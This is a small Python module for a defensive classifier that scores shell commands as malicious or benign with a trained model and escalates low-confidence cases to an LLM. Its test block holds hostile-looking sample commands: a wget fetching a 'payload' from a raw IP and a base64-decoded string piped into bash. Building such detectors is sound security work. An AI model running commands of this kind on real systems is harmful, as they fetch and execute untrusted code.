import joblib
import os

MODEL_DIR = os.path.dirname(os.path.abspath(__file__))
model = joblib.load(os.path.join(MODEL_DIR, "rf_model.joblib"))
vectorizer = joblib.load(os.path.join(MODEL_DIR, "tfidf_vectorizer.joblib"))

CONFIDENCE_THRESHOLD = 0.65  # below this, escalate to LLM fallback

def classify_ml(command: str):
    """
    Returns dict with label, confidence, layer.
    If confidence < threshold, caller should escalate to LLM.
    """
    X = vectorizer.transform([command.strip().lower()])
    pred = model.predict(X)[0]
    proba = model.predict_proba(X)[0]
    confidence = float(max(proba))

    label = "malicious" if pred == 1 else "benign"

    return {
        "label": label,
        "confidence": confidence,
        "layer": "ml",
        "needs_escalation": confidence < CONFIDENCE_THRESHOLD
    }


if __name__ == "__main__":
    tests = [
        "wget http://185.220.101.9/payload -O /tmp/p",
        "nano config.yaml",
        "base64 -d <<< aGVsbG8= | bash",
        "systemctl status nginx",
    ]
    for t in tests:
        print(t, "->", classify_ml(t))
